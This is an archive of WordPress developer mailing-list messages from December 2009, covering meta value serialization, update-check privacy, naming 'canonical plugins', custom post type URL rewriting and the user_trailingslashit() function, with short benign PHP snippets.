Subject: [wp-hackers] single quote #039; issue when querying the DB
In-Reply-To: <aae1bd0e-d442-436e-9b5b-3c3be8da4e9a@j4g2000yqe.googlegroups.com>
References: <aae1bd0e-d442-436e-9b5b-3c3be8da4e9a@j4g2000yqe.googlegroups.com>
Message-ID: <4B1D7F91.9060208@gaarai.com>

Looking at the meta functions in core (found in 
wp-admin/includes/post.php), the code to handle the meta value for the 
add, update, and get functions are as follows:

add_meta:
maybe_serialize( stripslashes( trim( $_POST['metavalue'] ) ) )

update_meta:
maybe_serialize( stripslashes( $meta_value ) )

get_post_meta_by_id:
if ( is_serialized_string( $meta->meta_value ) )
    $meta->meta_value = maybe_unserialize( $meta->meta_value );

As you can, the reason for the change is due to the serialization. I'm 
not sure exactly what you're trying to do, but using these code snippets 
should allow you to get further in your project.

Chris Jean
http://gaarai.com/
@chrisjean



Olivier wrote:
> Hello,
>
> I am encountering a big problem and I canno't find any "clean"
> solution.
>
> When a meta_value is saved within the usermeta table, if it contains a
> single quote then it is converted to #39;
> for instance : tot'o is converted to tot#39;o
>
> Then when you get it back from the DB, it will be tot#039;o (note the
> added 0). This is not a problem if you just need to output data.
>
> But when it comes to perform a query with a condition on the
> meta_value, then I am lost because when I convert the single quote
> with any function like esc_html, it is converted to #039; and not #39;
> so if I query on "WHERE meta_value = $myvalue" which contains #039; it
> will always fail :(
>
> Any idea?
>
> I could obviously add a function to convert 039 to 39 before sending
> to the DB but well, if there is any built in function that does all
> the job directly (clean one step conversion from single quote to
> #39;), I would rather use it.
>
> Thanks!
>
> Olivier
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From lynne.pope at gmail.com  Mon Dec  7 22:39:41 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Tue, 8 Dec 2009 11:39:41 +1300
Subject: [wp-hackers] Possible security patch
In-Reply-To: <a8405fa30912070938t5fb08a5fwd6410594c5841697@mail.gmail.com>
References: <OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<CC049146-4676-4595-9E90-EE5ED332F11A@armeda.com>
	<a8405fa30912070938t5fb08a5fwd6410594c5841697@mail.gmail.com>
Message-ID: <427667db0912071439r27634517ne4717bc77daefe3c@mail.gmail.com>

This is kinda like killing a mosquito with a sledgehammer.

Suggestion:
Allow users to select admin username at install time.

On the introduction to WordPress post add a note:

"Before You Start Posting

Nothing on the web is 100% secure. The version of WordPress that you are
using is as secure as possible but you can harden security with one simple
step.
Login to WordPress. Go to Users. Then create a new user account for
yourself, giving this account the Editor role.
Using this Editor account for posting makes your Administrator account
harder to identify. "

I don't like the idea of allowing usernames to be changed from the backend
and feel that the only changes needed are the ability to input a custom
admin name plus some education.

Lynne

From wp at xentek.net  Mon Dec  7 22:48:58 2009
From: wp at xentek.net (Eric Marden)
Date: Mon, 7 Dec 2009 17:48:58 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <427667db0912071439r27634517ne4717bc77daefe3c@mail.gmail.com>
References: <OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<CC049146-4676-4595-9E90-EE5ED332F11A@armeda.com>
	<a8405fa30912070938t5fb08a5fwd6410594c5841697@mail.gmail.com>
	<427667db0912071439r27634517ne4717bc77daefe3c@mail.gmail.com>
Message-ID: <F92445AA-84F7-4694-86A4-92E691C0D27F@xentek.net>

On Dec 7, 2009, at 5:39 PM, Lynne Pope wrote:

> I don't like the idea of allowing usernames to be changed from the  
> backend
> and feel that the only changes needed are the ability to input a  
> custom
> admin name plus some education.

Best idea yet. Is there a trac ticket for it yet? (hint hint ;)

- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From wordpress at santosj.name  Tue Dec  8 01:11:04 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Mon, 07 Dec 2009 19:11:04 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912071401k74e6ca94tb60e2e94e2e533ed@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com>
	<427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com>
	<4B1D1677.9020608@santosj.name>
	<427667db0912071401k74e6ca94tb60e2e94e2e533ed@mail.gmail.com>
Message-ID: <4B1DA7A8.5040402@santosj.name>

I should apologize, I realize that you are correct. It has been a long 
time and I've forgotten a lot of the issues that were bought up at that 
time.

Given the lack of popularity of the Tin-foil hat plugin compared to 
those using WordPress, I can say that it is unlikely that any options 
will be added. I believe it was discussed at that point, but a lot of 
the argument against it was that if only a few are ever going to turn it 
on, then it wasn't worth spending the time for development and testing 
to do it.

As far as the business connection, I think that well, it doesn't really 
matter what I think. I would hope that any business would weigh the 
advantages of what WordPress offers for keeping WordPress and plugins 
up-to-date and the time that is saved, however that is their business 
with how they want to handle that.

Furthermore, the lack of opt-in was intentional and there was, I 
believe, fear that people would care more about privacy than security 
and opt-out rather than be updated on when new releases are out. Given 
the apathy in the past, it seemed reasonable to assume it and given 
recent events, it seems that even with the update notifications that 
people are still not taking the update notifications seriously.

The Tin-foil hat plugin should solve your problems, but the code below 
could be applied to a plugin and would do what you wish with at least 
the useragent.

function paranoia_remove_url($default)
{
    global $wp_version;
    return 'WordPress/'.$wp_version;
}

add_filter('http_headers_useragent', 'paranoia_remove_url');

For what it is worth, I'm not against your idea, it is just that there 
are alternatives to which you speak and I'm wondering why those 
alternatives (i.e the filters) weren't applied first to the problem 
before attempting to change WordPress fundamentally for everyone. Also, 
I'll rather the statistics for PHP version be sent so that PHP4 can be 
dropped as soon as possible, unless their using PHP4, then please use 
the Tin-foil hat, so that they'll skew the results towards quicker 
adoption of PHP5+.

It should also be noted that the above will only remove the URL from the 
useragent. The plugins and themes and wp_version will still be sent, but 
I believe that is the only place where the Blog URL is sent.

Jacob Santos

Lynne Pope wrote:
> 2009/12/8 Jacob Santos <wordpress at santosj.name>
>
>   
>> In what way does WordPress.org or Automattic having your URL affect the
>> security and privacy of your site?
>>
>>     
>
> It compromises privacy because users are not being given the option to send
> or not send information about their site. It compromises security when users
> disable update checks in order to avoid sending information they don't wish
> to send.
>
> The specific response I got from the people I was working with was that
> business information, such as which plugins they use, is nobody's business
> except theirs. They consider this to be business information. Plugin and
> theme data contains identifying information about products and staff which
> they do not want broadcast to anyone.
>
>
>   
>> How does preventing WordPress.org from using this data protect you from
>> anything?
>>
>>     
>
> WordPress.org is not a legal entity and cannot therefore be held legally
> accountable for misuse of data. They have no confidence in WordPress.org's
> ability to keep the data private and confidential and say that as they do
> not opt-in to sharing it then wordpress.org has no legal right to collect
> it.
>
>
>   
>> Why doesn't the plugins available address your problems with privacy?
>>
>>
>> The filters were placed in for the sole purpose of overriding the URL that
>> is sent and for those concern with privacy. While it could be said that the
>> small amount of people who downloaded the plugin verses the much larger
>> amount that uses WordPress says that not enough people consider sending an
>> URL is all that important. It might just be that not enough people realize
>> that their WordPress is sending this information.
>>
>>     
>
> Which plugin just overrides the blog URL? If there is one that simply does
> that then I'd point them to it.
>
>
>   
>> It is but the URL, plugins, and themes, along with the PHP version that is
>> sent. None of the passwords, visitors (unless you use the WordPress.com
>> Stats plugin), etc is sent. There is also a legitimate and reasonable
>> purpose behind sending this data and it is to allow for upgrading those
>> plugins (however, the URL isn't required, unless they changed that, but you
>> could just send www.example.com if you wanted).
>>
>> By the way, the filters were a compromise to those who said to fork it.
>>
>>     
>
> Providing the means to check if plugins, theme, or core updates are
> available is great. The stickler is the sending of the blog URL (and for
> this company - data about custom plugins).
>
> IMO, there needs to be more transparency about what WordPress does behind
> the scenes and what data is collected. I understand the concerns when custom
> plugins & themes use staff and product names - this sends way too much
> identifying information!
>
> The alternative would be if WordPress only checked against theme and plugin
> names that are in the WordPress repository, instead of collecting data on
> every theme and plugin.
>
> I love the work you did on this Jacob. However, its now 2 years since
> wordpress.org started collecting blog URL's with the update and it's still
> unnecessary data capture. If WordPress.org has future plans for using this
> information then a simple opt-in would prevent these kinds of issues. If
> there is no good reason for capturing the URL then perhaps its time it was
> removed?
>
> Lynne
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From lynne.pope at gmail.com  Tue Dec  8 02:13:59 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Tue, 8 Dec 2009 15:13:59 +1300
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <4B1DA7A8.5040402@santosj.name>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com> 
	<427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com> 
	<4B1D1677.9020608@santosj.name>
	<427667db0912071401k74e6ca94tb60e2e94e2e533ed@mail.gmail.com> 
	<4B1DA7A8.5040402@santosj.name>
Message-ID: <427667db0912071813l63fb04e5p13c023687fe9044a@mail.gmail.com>

I hear what you are saying Jacob but have to wonder if there would be more
people seeing update notifications if some were not disabling these over
privacy concerns. With the company I mentioned, I had no idea they had used
these plugins to avoid sending their blog URL. I imagine there would be a
lot of us who work with users and who don't know what they have installed
until there is a problem.

A subset of current users were around in 2007 and took note when all hell
broke loose over the phone home. I suspect a larger proportion never see
reports about such things. The average user doesn't see Slashdot or follow
tech news. Since then, of course, thousands of new users have come along and
I doubt many of them are even aware of what information gets sent back.

Then there's the users who, in 2007, installed the plugins to block update
checks (the 2.3 announcement even linked to this) and who have just
blissfully carried on blocking. This is where the privacy concerns are
actually hurting WordPress. If we want people to use the automatic update we
should, in my opinion, not be giving them reasons for not using it. Sure,
its easy to look at the numbers and say most people don't care, but its just
as valid to say they might, if they knew about it.

For my last comment on this issue I just want to ask one thing - is it so
hard to simply remove the blog URL from being sent as part of the User-Agent
in the core? A function is all very well (and I thank you for that) but by
the time anyone mentions that they won't use WordPress or that they are
using plugins to remove update notifications its already too late to help
them out.

Lynne

2009/12/8 Jacob Santos <wordpress at santosj.name>

> I should apologize, I realize that you are correct. It has been a long time
> and I've forgotten a lot of the issues that were bought up at that time.
>
> Given the lack of popularity of the Tin-foil hat plugin compared to those
> using WordPress, I can say that it is unlikely that any options will be
> added. I believe it was discussed at that point, but a lot of the argument
> against it was that if only a few are ever going to turn it on, then it
> wasn't worth spending the time for development and testing to do it.
>
> As far as the business connection, I think that well, it doesn't really
> matter what I think. I would hope that any business would weigh the
> advantages of what WordPress offers for keeping WordPress and plugins
> up-to-date and the time that is saved, however that is their business with
> how they want to handle that.
>
> Furthermore, the lack of opt-in was intentional and there was, I believe,
> fear that people would care more about privacy than security and opt-out
> rather than be updated on when new releases are out. Given the apathy in the
> past, it seemed reasonable to assume it and given recent events, it seems
> that even with the update notifications that people are still not taking the
> update notifications seriously.
>
> The Tin-foil hat plugin should solve your problems, but the code below
> could be applied to a plugin and would do what you wish with at least the
> useragent.
>
> function paranoia_remove_url($default)
> {
>   global $wp_version;
>   return 'WordPress/'.$wp_version;
> }
>
> add_filter('http_headers_useragent', 'paranoia_remove_url');
>
> For what it is worth, I'm not against your idea, it is just that there are
> alternatives to which you speak and I'm wondering why those alternatives
> (i.e the filters) weren't applied first to the problem before attempting to
> change WordPress fundamentally for everyone. Also, I'll rather the
> statistics for PHP version be sent so that PHP4 can be dropped as soon as
> possible, unless their using PHP4, then please use the Tin-foil hat, so that
> they'll skew the results towards quicker adoption of PHP5+.
>
> It should also be noted that the above will only remove the URL from the
> useragent. The plugins and themes and wp_version will still be sent, but I
> believe that is the only place where the Blog URL is sent.
>
>
> Jacob Santos
>
> Lynne Pope wrote:
>
>> 2009/12/8 Jacob Santos <wordpress at santosj.name>
>>
>>
>>
>>> In what way does WordPress.org or Automattic having your URL affect the
>>> security and privacy of your site?
>>>
>>>
>>>
>>
>> It compromises privacy because users are not being given the option to
>> send
>> or not send information about their site. It compromises security when
>> users
>> disable update checks in order to avoid sending information they don't
>> wish
>> to send.
>>
>> The specific response I got from the people I was working with was that
>> business information, such as which plugins they use, is nobody's business
>> except theirs. They consider this to be business information. Plugin and
>> theme data contains identifying information about products and staff which
>> they do not want broadcast to anyone.
>>
>>
>>
>>
>>> How does preventing WordPress.org from using this data protect you from
>>> anything?
>>>
>>>
>>>
>>
>> WordPress.org is not a legal entity and cannot therefore be held legally
>> accountable for misuse of data. They have no confidence in WordPress.org's
>> ability to keep the data private and confidential and say that as they do
>> not opt-in to sharing it then wordpress.org has no legal right to collect
>> it.
>>
>>
>>
>>
>>> Why doesn't the plugins available address your problems with privacy?
>>>
>>>
>>> The filters were placed in for the sole purpose of overriding the URL
>>> that
>>> is sent and for those concern with privacy. While it could be said that
>>> the
>>> small amount of people who downloaded the plugin verses the much larger
>>> amount that uses WordPress says that not enough people consider sending
>>> an
>>> URL is all that important. It might just be that not enough people
>>> realize
>>> that their WordPress is sending this information.
>>>
>>>
>>>
>>
>> Which plugin just overrides the blog URL? If there is one that simply does
>> that then I'd point them to it.
>>
>>
>>
>>
>>> It is but the URL, plugins, and themes, along with the PHP version that
>>> is
>>> sent. None of the passwords, visitors (unless you use the WordPress.com
>>> Stats plugin), etc is sent. There is also a legitimate and reasonable
>>> purpose behind sending this data and it is to allow for upgrading those
>>> plugins (however, the URL isn't required, unless they changed that, but
>>> you
>>> could just send www.example.com if you wanted).
>>>
>>> By the way, the filters were a compromise to those who said to fork it.
>>>
>>>
>>>
>>
>> Providing the means to check if plugins, theme, or core updates are
>> available is great. The stickler is the sending of the blog URL (and for
>> this company - data about custom plugins).
>>
>> IMO, there needs to be more transparency about what WordPress does behind
>> the scenes and what data is collected. I understand the concerns when
>> custom
>> plugins & themes use staff and product names - this sends way too much
>> identifying information!
>>
>> The alternative would be if WordPress only checked against theme and
>> plugin
>> names that are in the WordPress repository, instead of collecting data on
>> every theme and plugin.
>>
>> I love the work you did on this Jacob. However, its now 2 years since
>> wordpress.org started collecting blog URL's with the update and it's
>> still
>> unnecessary data capture. If WordPress.org has future plans for using this
>> information then a simple opt-in would prevent these kinds of issues. If
>> there is no good reason for capturing the URL then perhaps its time it was
>> removed?
>>
>> Lynne
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://twitter.com/elpie/

From zamoose at gmail.com  Tue Dec  8 03:44:24 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Mon, 7 Dec 2009 22:44:24 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
Message-ID: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>

While I certainly appreciate the effort put in by the Core team in putting
forth an Official list of alternatives to "Canonical" plugins  (
http://wordpress.org/development/2009/12/canonical-plugins/), I feel as
though many of the options are, well, sub-Standard. I think we're missing
out on a Premium opportunity to do some promotion of WordPress to
demographics that we might not hit otherwise. What follows is a list of
suggestions and their target demos to add to the queue. I've thick skin, so
don't worry if you don't like some of them -- I don't need your praise to
feel Validated.

-BuddyPlugins: Hey, WordPress-based social networking is hot right now, as
anyone that's been to a WordCamp knows. Let's take advantage of it!

-Top-Ranked: SEO bloggers will go nuts for this.

-Buffed (EQ/BUF): All you WoW players will shout for joy when you come
across a gold-colored plugin. Finally, you can retire that light green
Twitter plugin you've been hanging on to for want of something better!

-Sidekicks: Holy Open Source development, Batman! We're sure to grab some
comic book aficionados' attention with this one.

-Henchmen (Hench-plugins?): The evil genius/mad overlord blogger demo is
vastly under-served. Willing to bet Viktor von Doom uses F/L/OSS in his
battle armor.

-Expansion Packs: FPS fans will love these and we might even be able to get
a few professional Star Craft players to endorse 'em.

-Downloadable Content (DLC): Xbox360 gamers and Rock Band players, ahoy!

-The Back-up Band: Any good musician that's spent their time in smoky blues
clubs knows that the front man ain't nothin' without their drums, bass, etc.

Feel free to add your own. *grin*

(In all seriousness, I think "Endorsed", "Backed", "Supported" or
"Recommended" also belong on the real list...)

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From mikeschinkel at newclarity.net  Tue Dec  8 04:03:18 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 7 Dec 2009 23:03:18 -0500
Subject: [wp-hackers] Canonical Plugins = Optional Modules?
Message-ID: <B402EF0D-1083-437A-A868-FC009319630D@newclarity.net>

Hi all:

Really excited to learn that Matt et. al. are promoting the concept of the "canonical plugin."

http://wordpress.org/development/2009/12/canonical-plugins/

Sounds almost exactly like what I was proposing back in February which I proposed to be called "Optional Modules":

http://lists.automattic.com/pipermail/wp-hackers/2009-February/024242.html

Whatever the case, really glad to see the idea making a comeback and being officially supported, no matter what the name they give it.

-Mike 

From markjaquith at gmail.com  Tue Dec  8 04:51:42 2009
From: markjaquith at gmail.com (Mark Jaquith)
Date: Mon, 7 Dec 2009 23:51:42 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
Message-ID: <2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>

On Mon, Dec 7, 2009 at 10:44 PM, Doug Stewart <zamoose at gmail.com> wrote:
> Feel free to add your own. *grin*

Some of the ones suggested in jest:

- Mark-coded (I'll go into seclusion and write them all!)
- Matt's choice (no community input?? Matt picks his favorites based
on their use of puns and big blue headers)
- Classy (
- Finger-licking Good (rated on a 1-5 BBQ-stained fingers scale)

> (In all seriousness, I think "Endorsed", "Backed", "Supported" or
> "Recommended" also belong on the real list...)

Some of these are reasonable contenders. We didn't want to overwhelm
the poll with too many options!

One of our concerns is to minimize the "what it says about all the
other plugins" effect. We don't want everyone else to feel like
they're being deprecated or downplayed. Imagine what people will call
the plugins that aren't canonical, based on the names you consider.

-- 
Mark Jaquith
? http://markjaquith.com/
? http://coveredwebservices.com/

From s.kuzmenko at gmail.com  Tue Dec  8 04:53:34 2009
From: s.kuzmenko at gmail.com (Sergiy Kuzmenko)
Date: Mon, 7 Dec 2009 23:53:34 -0500
Subject: [wp-hackers] hacking image resizing
Message-ID: <e34a76360912072053n2abf0a8fodf874449525020af@mail.gmail.com>

I had a bit of a problem with image resizing. Images sized stay greyed out
no matter what. GD library is enabled. In fact I tried it on two machines.
It worked fine on my Fedora desktop but failed on on the Ubuntu (hardy)
server. There is a thread in support forum about this (apparently I am not
alone) so I suspected it might be a bug. Looking at the code and trying to
find the root cause I discovered that on the  machine where I have this
problem the assoc. array containing image data has no "sizes" element
required to trigger image resizing (wp-includes/media.php, function
image_get_intermediate_size).

Apparently, this assoc. array gets loaded from $wp_object_cache where it is
supposed to be initialized somehow at an earlier stage.  And this is where I
get stuck. It is not very obvious which code is loading that info into
$wp_object_cache. Doing "grep -r sizes | grep -v .js" does not reveal
anything worth attention. I wonder if someone could elucidate me on how
image sizes get loaded into cache.

Many thanks.
Sergiy

From markjaquith at gmail.com  Tue Dec  8 05:01:14 2009
From: markjaquith at gmail.com (Mark Jaquith)
Date: Tue, 8 Dec 2009 00:01:14 -0500
Subject: [wp-hackers] single quote #039; issue when querying the DB
In-Reply-To: <aae1bd0e-d442-436e-9b5b-3c3be8da4e9a@j4g2000yqe.googlegroups.com>
References: <aae1bd0e-d442-436e-9b5b-3c3be8da4e9a@j4g2000yqe.googlegroups.com>
Message-ID: <2979bd660912072101v7b585351pa47a9a1f89f2a731@mail.gmail.com>

On Mon, Dec 7, 2009 at 4:18 PM, Olivier <autremonde75 at gmail.com> wrote:
> When a meta_value is saved within the usermeta table, if it contains a
> single quote then it is converted to #39;
> for instance : tot'o is converted to tot#39;o

On which version are you seeing this? I just tested and it was in the
database exactly as entered: tot'o

-- 
Mark Jaquith
? http://markjaquith.com/
? http://coveredwebservices.com/

From zamoose at gmail.com  Tue Dec  8 05:06:48 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Tue, 8 Dec 2009 00:06:48 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com> 
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
Message-ID: <71ddd7490912072106h1240df81p6223be61e18202a3@mail.gmail.com>

On Mon, Dec 7, 2009 at 11:51 PM, Mark Jaquith <markjaquith at gmail.com> wrote:

> On Mon, Dec 7, 2009 at 10:44 PM, Doug Stewart <zamoose at gmail.com> wrote:
> > Feel free to add your own. *grin*
>
> Some of the ones suggested in jest:
>
> - Mark-coded (I'll go into seclusion and write them all!)
> - Matt's choice (no community input ? Matt picks his favorites based
> on their use of puns and big blue headers)
> - Classy (
> - Finger-licking Good (rated on a 1-5 BBQ-stained fingers scale)
>
> > (In all seriousness, I think "Endorsed", "Backed", "Supported" or
> > "Recommended" also belong on the real list...)
>
> Some of these are reasonable contenders. We didn't want to overwhelm
> the poll with too many options!
>
> One of our concerns is to minimize the "what it says about all the
> other plugins" effect. We don't want everyone else to feel like
> they're being deprecated or downplayed. Imagine what people will call
> the plugins that aren't canonical, based on the names you consider.
>
>
>
I might also recommend the monikers "First Party" or "In-House" for
consideration, as per movie/video game studios...


-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From mikeschinkel at newclarity.net  Tue Dec  8 05:34:00 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 00:34:00 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
Message-ID: <D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>

On Dec 7, 2009, at 11:51 PM, Mark Jaquith wrote:
> 
> One of our concerns is to minimize the "what it says about all the
> other plugins" effect. We don't want everyone else to feel like
> they're being deprecated or downplayed. Imagine what people will call
> the plugins that aren't canonical, based on the names you consider.

Mark,

What's the purpose for these canonical plugins?  My assumption would be that they are there to provide functionality for specific use cases that are not applicable to the general purpose uses of WordPress.  For example might these plugins go to provide functionality along 

-- Membership sites
-- Multi-author professional publishing sites
-- Real-Estate focused sites
-- Advanced CMS functionality
-- Multimedia Gallery functionality
-- Facebook Connect
-- And so on...

If I'm in sync with what you are thinking then it would seem these are use-case specific plugins. Maybe they are "vertical plugins", "specialty plugins", "domain-specific plugins", or even "optional modules?" (The latter being a named I proposed before.) None of those cause the other plugins to be downplayed.

Also, will these canonical plugins be listed in special place in the admin console where there is actually a list of the plugins that can be enabled (so they don't have to be so hard to discover?) 

And could some of these canonical plugins offer functionality that is only of use to other plugin authors (i.e. a library of routines) instead of all of them being only with end-user functionality?

How will these canonical plugins be decided upon? Will existing ones be elevated, or will they be all new projects?

-Mike

From mikeschinkel at newclarity.net  Tue Dec  8 05:37:56 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 00:37:56 -0500
Subject: [wp-hackers] About "Post Type Voodoo" (a plugin for WordPress 2.9+)
Message-ID: <CEA3F90A-B09A-4C73-8A2A-C753639A660F@newclarity.net>

Hi all,

So after all the debate on custom urls and custom post types I've been working on a plugin during all my free time for the past 3 days.  I started with the HTDIR plugin Dion wrote and took those lessons an have greatly embellished.

http://dd32.id.au/uploads/2009/11/HTDIR_URL_Rewrite.zip

I've tried to incorporate the example below that Otto provided but after many hours of working could not get it to work for my use cases:

function plugin_add_custom_urls() {
add_rewrite_rule('products/(.*)[/]?$', 'index.php?product=$matches[1]', 'top');
add_rewrite_tag('%product%','.*');
}
add_action('init', 'plugin_add_custom_urls');

function plugin_add_template() {
$product = get_query_var('product');
if (!empty($product)) {
  locate_template(array("products/$product.php","products/index.php"), true);
  exit;
}
}
add_action('template_redirect', 'plugin_add_template');

I originally started down the path of creating a generic URL rewriting component but have since decided to first focus on what I believe is probably 80% of the need for custom URLs and that's for custom post types.  So I decided to build a plugin that focuses on enabling custom post types that of course first handles custom URLs for custom post types.  

After much work I've learned a lot and even challenged some of my own original assumptions.  One of the things I learned was how incredibly hard it is to get URL rewriting working in WordPress.  Maybe that's why this comment can be found in core for the WP_Rewrite() function:

* The main WP_Rewrite function for building the rewrite rule list. The
* contents of the function is a mix of black magic and regular expressions,
* so best just ignore the contents and move to the parameters.

One of the biggest problems is making sure things are initialized before you run them.  I started with a hard-coded proof of concept and made it work, and as I refactored to make it more generic it kept braking because things I needed hadn't been loaded yet.  I also realized that what I really needed was to define post types in the admin and along with the post types I needed to define their permalinks too. I still strongly believe this should be in the core but since so many people on this list debate that I've just decided to write my own plugin for it which I call "Post Type Voodoo."  (Why "Voodoo?"  Because it was much harder than it should have been to implement, kinda like voodoo, and because people act like it such a big deal that it can't possibly be put into core that it must be voodoo.)

Anyway, I realized  the approach of calling an add_custom_url() in the theme's functions.php is really not workable or even desirable. What's really needed is a place in the admin where post types can be defined and also a (ideally shared) in the database where post types and related info can be persisted.  (If not stored in the database then the load order problem becomes more an issue and also plugins wanting to add post types will potentially trample on each other.  Don't say I didn't warn you...)

I've also uncovered some questions.  If we have custom post types and we have the ability to tag and categories custom post types (as we should) then what should these urls display for the posts of a custom type tagged "foo" and categorized as "bar", respectively (include or not include the custom post types?)

http://www.example.com/tag/foo/
http://www.example.com/category/bar/

And if we have a custom post type named "product" with a product named "widget" will it's default URL not have date and time components (I assume "no"), i.e.:

http://www.example.com/products/widget/

And will this URL work for all products tagged "premium" and if so does it exclude us from having a product named "tag?"

http://www.example.com/products/tag/premium/

And will we need to have a different edit page for each post type of can we use a consolidated edit page, i.e.

http://wordpress.dev/wp-admin/post.php?action=edit&post_type=product&post={post_id}

 And so on... (I'm sure I'll have more later.)

Anyway, I've run into things I still can't figure out so wanted to ask some questions which I'll do in follow up emails.

-Mike Schinkel
P.S. The "Post Type Voodoo" is currently a work in progress which I'll release once I get to "minimum viable product" stage.  If anyone is interested in reviewing as-is, please email me directly.


From mikeschinkel at newclarity.net  Tue Dec  8 05:50:08 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 00:50:08 -0500
Subject: [wp-hackers] $wp_rewrite->add_permstruct() vs. add_rewrite_rule()
Message-ID: <EA543A65-D63F-4A60-A933-B8D045CA2EFE@newclarity.net>

Hi all:

Okay you WP_Rewrite() gurus, now's your time to shine.  

So I've been trying to figure out $wp_rewrite->add_permstruct() vs. add_rewrite_rule() for the past several days. I've been able to get the former to work but not the latter.  I'm trying to figure out when we would use one and when we would use the other?

It *seems* like using add_permastruct() can get you support or things like custom single_template and that add_rewrite_rule() would require use of template_redirect, but I can't be 100% sure?

Can anyone shed some light on these two?  Google has not been my friend in the case of these two functions and how to best use them.

-Mike 



From mikeschinkel at newclarity.net  Tue Dec  8 05:57:00 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 00:57:00 -0500
Subject: [wp-hackers] user_trailingslashit()?
Message-ID: <0DE22E7F-279A-405C-8CE5-35C295C11B60@newclarity.net>

Hi all:

So here's another question; what exactly is user_trailingslashit() for and how are they supposed to be used?  Google is decidedly *not* my friend here and reading the code does me little better.

This is from the code provided by Diaon (dd32).  I don't understand why he first does trailingslashit() and then user_trailingslashit().  Any idea?

        $permastruct = $wp_rewrite->get_page_permastruct();
        if (!empty($permastruct)) {
          $link = trailingslashit(get_bloginfo('home')) . str_replace('%pagename%', $post_type['plural'] . '/' . $post->post_name, $permastruct);
          $link = user_trailingslashit($link);
        } else {
          $link = trailingslashit(get_bloginfo('home')) . '?' . $post_type['name'] . '=' . $post->post_name;
        }

Any idea why something would run the user_trailingslashit filter?

-Mike

From if.website at gmail.com  Tue Dec  8 06:02:31 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 8 Dec 2009 00:02:31 -0600
Subject: [wp-hackers] user_trailingslashit()?
In-Reply-To: <0DE22E7F-279A-405C-8CE5-35C295C11B60@newclarity.net>
References: <0DE22E7F-279A-405C-8CE5-35C295C11B60@newclarity.net>
Message-ID: <674b4a3b0912072202y6aa83d0fw13e87ea40816d6da@mail.gmail.com>

On Mon, Dec 7, 2009 at 11:57 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> So here's another question; what exactly is user_trailingslashit() for and how are they supposed to be used? ?Google is decidedly *not* my friend here and reading the code does me little better.

One blog might want the permalink structure to be

/%year%/%monthnum%/%day%/%postname%/  (trailing slash)

another might want instead

/%year%/%monthnum%/%day%/%postname%  (no trailing slash).

user_trailingslashit() makes whatever URL you pass to it consistent
with that preference as set in Settings > Permalinks.

Does that make sense?

From anacin at gwhatchet.com  Tue Dec  8 06:02:53 2009
From: anacin at gwhatchet.com (Andrew Nacin)
Date: Tue, 8 Dec 2009 01:02:53 -0500
Subject: [wp-hackers] user_trailingslashit()?
In-Reply-To: <0DE22E7F-279A-405C-8CE5-35C295C11B60@newclarity.net>
